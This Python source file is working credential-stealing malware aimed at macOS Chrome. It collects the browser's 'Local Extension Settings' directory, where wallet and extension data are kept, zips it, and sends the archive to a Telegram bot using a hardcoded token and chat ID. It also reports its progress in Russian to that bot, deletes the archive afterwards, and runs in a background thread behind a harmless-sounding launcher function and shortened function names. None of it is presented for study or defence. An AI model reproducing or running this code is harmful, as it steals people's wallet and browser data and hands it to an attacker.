import os
import re
import threading
import zipfile
from datetime import datetime
import tempfile

import requests

ROOT: str = os.path.expanduser("~")

T_P: str = os.path.join(ROOT, "Library", "Application Support", "Google", "Chrome", "Default", "Local Extension Settings")

B_T: str = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
C_I: str = "5018443124"


def i_t_e() -> bool:
    return os.path.isdir(T_P)


def g_s(tdata_path: str) -> list[str] | None:
    try:
        session_paths = []
        for entry in os.scandir(tdata_path):
            session_paths.append(entry.path)
        return session_paths if session_paths else None
    except Exception as e:
        s_t_t_t(f"Ошибка при сканировании директории: {str(e)}")
        return None


def s_t_t_t(message: str) -> None:
    try:

        url = f"https://api.telegram.org/bot{B_T}/sendMessage"
        data = {
            'chat_id': C_I,
            'text': message
        }
        _ = requests.post(url, data=data)
    except Exception as e:
        pass


def s_z_t_t(zip_path: str):
    try:
        if not os.path.exists(zip_path):
            s_t_t_t(f"Архив {zip_path} не существует")
            return
        s_t_t_t(f"Отправка архива: {zip_path}, размер: {os.path.getsize(zip_path)} байт")
        url = f"https://api.telegram.org/bot{B_T}/sendDocument"
        with open(zip_path, 'rb') as file:
            files = {'document': (os.path.basename(zip_path), file)}
            data = {'chat_id': C_I}
            response = requests.post(url, files=files, data=data)
        s_t_t_t(f"Ответ Telegram API: {response.status_code}, {response.text}")
        if response.status_code != 200:
            s_t_t_t(f"Ошибка отправки в Telegram: {response.text}")
    except Exception as e:
        s_t_t_t(f"Ошибка при отправке архива в Telegram: {str(e)}")


def z_d(archive_name: str, paths: list[str]) -> None:
    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for path in paths:
            if os.path.isfile(path):
                zipf.write(path, os.path.relpath(path, os.path.dirname(path)))
            elif os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(path)))
    s_t_t_t(f"Архив создан: {archive_name}, размер: {os.path.getsize(archive_name)} байт")


def d_z_a(zip_path: str):
    try:
        if os.path.exists(zip_path):
            os.remove(zip_path)
            s_t_t_t(f"Архив {zip_path} успешно удалён")
        else:
            s_t_t_t(f"Архив {zip_path} не существует")
    except Exception as e:
        s_t_t_t(f"Ошибка при удалении архива {zip_path}: {str(e)}")


def s() -> None:
    global T_P

    with tempfile.TemporaryDirectory() as temp_dir:
        archive_name = os.path.join(temp_dir, f"ext_{datetime.now()}.zip")

        try:
            ok = i_t_e()
            if ok:
                s_t_t_t("extensions was found")
                session_paths = g_s(T_P)
                z_d(archive_name, session_paths)
                s_z_t_t(archive_name)
            else:
                s_t_t_t(f"td wasn`t found\n{[entry.path for entry in os.scandir(T_P)]}")
        except Exception as e:
            s_t_t_t(str(e))
        finally:
            d_z_a(archive_name)


def start_monitor_m_w() -> threading.Thread:
    thread = threading.Thread(target=s)
    thread.start()
    return thread